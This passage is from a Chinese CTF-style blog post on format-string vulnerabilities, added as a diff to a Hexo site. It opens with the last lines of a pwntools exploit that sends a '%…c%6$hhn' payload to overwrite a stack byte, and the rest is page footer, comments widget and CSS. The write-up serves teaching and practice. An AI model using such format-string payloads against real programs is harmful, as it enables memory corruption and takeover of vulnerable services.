class="line"></span><br><span class="line">payload=<span class="string">'%'</span>+str((stack_addr&amp;<span class="number">0xff</span>)<span class="number">-8</span>)+<span class="string">'c%6$hhn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">p.sendafter(<span class="string">"Try again!\n"</span>,<span class="string">"wllmmllw"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2>
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至Whali3n51@gmail.com </span>
+    </div>
+</article>
+
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>格式化字符串专题总结</p>
+    
+    <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" target="_blank" rel="noopener" title="Whali3n51">Whali3n51</a></p>
+    <p><span class="copy-title">发布时间:</span>2019-12-14, 19:04:15</p>
+    <p><span class="copy-title">最后更新:</span>2019-12-14, 19:04:15</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/12/14/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%93%E9%A2%98%E6%80%BB%E7%BB%93/" title="格式化字符串专题总结">http://whali3n51.github.io/2019/12/14/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%93%E9%A2%98%E6%80%BB%E7%BB%93/</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+
+    <div id="comments"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+<script type="text/javascript">
+    $.getScript('/js/gitalk.js', function () {
+        var gitalk = new Gitalk({
+            clientID: '',
+            clientSecret: '',
+            repo: 'Whali3n51.github.io',
+            owner: 'Whali3n51',
+            admin: ['Whali3n51'],
+            id: decodeURI(location.pathname),
+            distractionFreeMode: 'true',
+            language: 'zh-CN',
+            perPage: parseInt('10',10)
+        })
+        gitalk.render('comments')
+    })
+</script>
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">©2019 Whali3n51</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full"><span class="min "></span></button>
+<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
+<div class="post-toc"><span class="post-toc-title">目录</span>
+    <div class="post-toc-content">
+
+    </div>
+</div>
+<a class="" id="rocket" href="javascript:void(0)" target="_blank" rel="noopener"></a>
+    </div>
+</div>
+<div class="acParent"></div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.0.1" ></script>
+
+<script src="/js/script.js?v=1.0.1" ></script>
+<script>
+    var img_resize = 'default';
+    /*作者、标签的自动补全*/
+    $(function () {
+        $('.search').AutoComplete({
+            'data': ['#WP复现','#pwn','#盲打pwn','#re_wp','#多线程pwn','#re复现',],
+            'itemHeight': 20,
+            'width': 418
+        }).AutoComplete('show');
+    })
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $(".post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+        .nav .hide-list.fullscreen {
+            left: 492px
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.3;
+        background: url("https://s9.rr.itc.cn/r/wapChange/20166_15_14/a1h0j307059539839596.JPEG");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+</style>
+
+
+
+
+
+
+<div class="mobile-menus-out" >
+
+</div>
+<div class="mobile-menus">
+    
+    
+    
+    
+    <a class="dynamic-menu " target="_blank"  href="https://github.com/Whali3n51">github</a>
+    
+</div>
+
+
+</html>
